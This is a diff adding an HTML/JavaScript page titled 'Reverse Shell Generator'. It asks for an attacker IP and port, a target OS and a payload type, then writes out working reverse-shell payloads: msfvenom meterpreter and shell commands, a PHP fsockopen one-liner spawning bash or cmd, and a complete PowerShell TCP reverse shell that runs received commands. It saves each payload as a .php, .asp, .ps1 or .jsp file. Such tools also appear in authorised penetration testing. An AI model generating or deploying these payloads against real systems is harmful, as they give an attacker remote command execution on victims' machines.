@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RSG</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #111;
+            color: #0f0;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.5;
+        }
+        
+        .step {
+            display: none;
+            margin-bottom: 20px;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        input, select {
+            width: 100%;
+            background: #222;
+            border: 1px solid #333;
+            color: #0f0;
+            padding: 8px;
+            margin: 5px 0 15px;
+        }
+        
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 8px 15px;
+            cursor: pointer;
+            width: 100%;
+            margin: 5px 0;
+        }
+        
+        button.secondary {
+            background: transparent;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+        
+        #output {
+            white-space: pre-wrap;
+            background: #222;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 3px solid #0f0;
+        }
+        
+        .filename {
+            display: flex;
+            margin: 15px 0;
+        }
+        
+        .filename input {
+            flex-grow: 1;
+            margin: 0 5px 0 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>Reverse Shell Generator</h1>
+    
+    <!-- Step 1: LHOST -->
+    <div class="step active" id="step1">
+        <h3>1. Your IP (LHOST):</h3>
+        <input type="text" id="lhost" placeholder="192.168.1.100" autofocus>
+        <button onclick="nextStep(1)">Continue</button>
+    </div>
+    
+    <!-- Step 2: LPORT -->
+    <div class="step" id="step2">
+        <h3>2. Listening Port (LPORT):</h3>
+        <input type="number" id="lport" placeholder="4444" min="1" max="65535">
+        <button onclick="nextStep(2)">Continue</button>
+        <button class="secondary" onclick="prevStep(2)">Back</button>
+    </div>
+    
+    <!-- Step 3: OS -->
+    <div class="step" id="step3">
+        <h3>3. Target OS:</h3>
+        <select id="os">
+            <option value="windows">Windows</option>
+            <option value="linux">Linux</option>
+        </select>
+        <button onclick="nextStep(3)">Continue</button>
+        <button class="secondary" onclick="prevStep(3)">Back</button>
+    </div>
+    
+    <!-- Step 4: Arch -->
+    <div class="step" id="step4">
+        <h3>4. Architecture:</h3>
+        <select id="arch">
+            <option value="x86">x86 (32-bit)</option>
+            <option value="x64">x64 (64-bit)</option>
+        </select>
+        <button onclick="nextStep(4)">Continue</button>
+        <button class="secondary" onclick="prevStep(4)">Back</button>
+    </div>
+    
+    <!-- Step 5: Payload Type -->
+    <div class="step" id="step5">
+        <h3>5. Payload Type:</h3>
+        <select id="payload">
+            <option value="netcat">Simple Netcat</option>
+            <option value="meterpreter">Meterpreter</option>
+        </select>
+        <button onclick="nextStep(5)">Continue</button>
+        <button class="secondary" onclick="prevStep(5)">Back</button>
+    </div>
+    
+    <!-- Step 6: Format -->
+    <div class="step" id="step6">
+        <h3>6. Payload Format:</h3>
+        <select id="format">
+            <!-- Dynamically populated -->
+        </select>
+        <button onclick="generate()">Generate</button>
+        <button class="secondary" onclick="prevStep(6)">Back</button>
+    </div>
+    
+    <!-- Output -->
+    <div class="step" id="step7">
+        <h3>Generated Payload:</h3>
+        <div id="output"></div>
+        
+        <div class="filename">
+            <input type="text" id="filename" placeholder="shell" value="shell">
+            <select id="extension">
+                <!-- Dynamically populated -->
+            </select>
+        </div>
+        
+        <button onclick="saveFile()">Save File</button>
+        <button class="secondary" onclick="reset()">New Payload</button>
+    </div>
+
+    <script>
+        const formats = {
+            windows: {
+                netcat: ['php', 'asp', 'aspx', 'powershell', 'java'],
+                meterpreter: ['php', 'asp', 'powershell']
+            },
+            linux: {
+                netcat: ['php', 'java'],
+                meterpreter: ['php']
+            }
+        };
+        
+        const extensions = {
+            php: 'php',
+            asp: 'asp',
+            aspx: 'aspx',
+            powershell: 'ps1',
+            java: 'jsp'
+        };
+        
+        let currentStep = 1;
+        
+        function nextStep(step) {
+            if (step === 1 && !validateIP(document.getElementById('lhost').value)) {
+                alert('Invalid IP address');
+                return;
+            }
+            
+            if (step === 2 && !validatePort(document.getElementById('lport').value)) {
+                alert('Invalid port (1-65535)');
+                return;
+            }
+            
+            if (step === 5) {
+                updateFormatOptions();
+            }
+            
+            document.getElementById(`step${step}`).classList.remove('active');
+            document.getElementById(`step${step+1}`).classList.add('active');
+            currentStep = step + 1;
+        }
+        
+        function prevStep(step) {
+            document.getElementById(`step${step}`).classList.remove('active');
+            document.getElementById(`step${step-1}`).classList.add('active');
+            currentStep = step - 1;
+        }
+        
+        function updateFormatOptions() {
+            const os = document.getElementById('os').value;
+            const payload = document.getElementById('payload').value;
+            const formatSelect = document.getElementById('format');
+            
+            formatSelect.innerHTML = '';
+            formats[os][payload].forEach(format => {
+                const option = document.createElement('option');
+                option.value = format;
+                option.textContent = format;
+                formatSelect.appendChild(option);
+            });
+        }
+        
+        function generate() {
+            const lhost = document.getElementById('lhost').value;
+            const lport = document.getElementById('lport').value;
+            const os = document.getElementById('os').value;
+            const arch = document.getElementById('arch').value;
+            const payload = document.getElementById('payload').value;
+            const format = document.getElementById('format').value;
+            
+            let code = '';
+            
+            if (payload === 'meterpreter') {
+                if (format === 'php') {
+                    code = `msfvenom -p php/meterpreter_reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw`;
+                } 
+                else if (format === 'asp') {
+                    code = `msfvenom -p windows${arch === 'x64' ? '/x64' : ''}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f asp`;
+                }
+                else if (format === 'powershell') {
+                    code = `msfvenom -p windows${arch === 'x64' ? '/x64' : ''}/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f psh`;
+                }
+            } else {
+                if (format === 'php') {
+                    if (os === 'linux') {
+                        code = `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/bash -i <&3 >&3 2>&3");'`;
+                    } else {
+                        code = `php -r "$sock=fsockopen('${lhost}',${lport});exec('cmd /c <&3 >&3 2>&3');"`;
+                    }
+                }
+                else if (format === 'asp') {
+                    code = `msfvenom -p windows${arch === 'x64' ? '/x64' : ''}/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f asp`;
+                }
+                else if (format === 'aspx') {
+                    code = `msfvenom -p windows${arch === 'x64' ? '/x64' : ''}/shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f aspx`;
+                }
+                else if (format === 'powershell') {
+                    code = `$client = New-Object System.Net.Sockets.TCPClient("${lhost}",${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`;
+                }
+                else if (format === 'java') {
+                    code = `msfvenom -p java/jsp_shell_reverse_tcp LHOST=${lhost} LPORT=${lport} -f raw`;
+                }
+            }
+            
+            document.getElementById('output').textContent = code;
+            
+            // Update extension options
+            const extSelect = document.getElementById('extension');
+            extSelect.innerHTML = '';
+            const ext = extensions[format];
+            const option = document.createElement('option');
+            option.value = ext;
+            option.textContent = '.' + ext;
+            extSelect.appendChild(option);
+            
+            document.getElementById('step6').classList.remove('active');
+            document.getElementById('step7').classList.add('active');
+            currentStep = 7;
+        }
+        
+        function saveFile() {
+            const content = document.getElementById('output').textContent;
+            const filename = document.getElementById('filename').value;
+            const extension = document.getElementById('extension').value;
+            
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename + extension;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+        
+        function reset() {
+            currentStep = 1;
+            document.querySelectorAll('.step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById('step1').classList.add('active');
+            document.getElementById('lhost').value = '';
+            document.getElementById('lport').value = '';
+            document.getElementById('lhost').focus();
+        }
+        
+        function validateIP(ip) {
+            return /^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip);
+        }
+        
+        function validatePort(port) {
+            const num = parseInt(port);
+            return !isNaN(num) && num > 0 && num <= 65535;
+        }
+    </script>
+</body>
+</html>
